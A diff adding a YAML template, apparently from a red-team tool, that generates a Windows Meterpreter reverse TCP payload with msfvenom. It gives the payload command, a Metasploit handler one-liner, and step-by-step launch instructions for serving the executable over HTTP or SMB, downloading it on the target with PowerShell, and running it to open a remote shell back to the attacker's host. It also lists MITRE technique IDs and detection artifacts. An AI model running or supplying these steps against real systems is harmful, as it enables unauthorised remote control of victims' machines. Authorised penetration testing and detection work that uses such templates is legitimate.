@@ -1,0 +1,72 @@
+meta:
+  name: "Basic Msfvenom Reverse TCP Shell"
+  category: ""
+  description: |
+    Generates a basic Windows reverse TCP Meterpreter payload using msfvenom.
+    This is a staged payload that connects back to the attacker's listener.
+
+    Staged payloads are smaller in size but require a multi-step delivery process.
+    The initial stager downloads the full Meterpreter payload from the handler.
+
+    Note: This uses default msfvenom signatures and will likely be detected
+    by modern antivirus solutions without additional obfuscation.
+
+  effectiveness: low
+
+  mitre:
+    tactic: "TA0002 - Execution"
+    technique: "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+
+  artifacts:
+    - "Metasploit framework signatures in binary"
+    - "Outbound TCP connection to LHOST:LPORT"
+    - "Known msfvenom payload patterns"
+    - "Meterpreter DLL in memory after staging"
+
+parameters:
+  - name: "lhost"
+    type: "ip"
+    description: "Attacker's IP address for reverse connection"
+    required: true
+
+  - name: "lport"
+    type: "port"
+    description: "Attacker's listening port"
+    required: true
+    default: 4444
+
+  - name: "output_file"
+    type: "string"
+    description: "Output executable filename"
+    required: true
+    default: "payload.exe"
+
+  - name: "output_path"
+    type: "path"
+    description: "Output directory for generated payload"
+    required: true
+    default: "{config.output_dir}"
+
+preprocessing: []
+
+output:
+  type: "command"
+  command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} -f exe -o {{ output_path }}/{{ output_file }}"
+
+  launch_instructions: |
+    Step 1: Start Metasploit listener
+    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; exploit"
+
+    Step 2: Transfer payload to target
+    Option A: HTTP server
+    python3 -m http.server 8000
+    Then on target: powershell -c "IWR -Uri http://{{ lhost }}:8000/{{ output_file }} -OutFile {{ output_file }}"
+
+    Option B: SMB share
+    impacket-smbserver share . -smb2support
+    Then on target: copy \\{{ lhost }}\share\{{ output_file }} {{ output_file }}
+
+    Step 3: Execute on target
+    {{ output_file }}
+
+    Note: This is a staged payload - requires network connectivity to download full Meterpreter
